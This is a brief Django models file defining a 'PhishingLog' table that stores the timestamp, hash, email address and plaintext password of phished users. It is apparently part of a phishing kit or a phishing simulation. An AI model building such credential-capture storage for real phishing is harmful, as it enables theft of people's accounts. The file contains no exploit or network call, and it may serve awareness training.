from django.contrib.auth.models import *
# Create your models here.


class PhishingLog(models.Model):
    timestamp = models.DateTimeField(auto_now_add=True)
    hash = models.CharField(max_length=100)
    email = models.EmailField(max_length=200)
    password = models.CharField(max_length=200)

    def __str__(self):
        return 'User: {}, Email: {}'.format(self.hash, self.email)
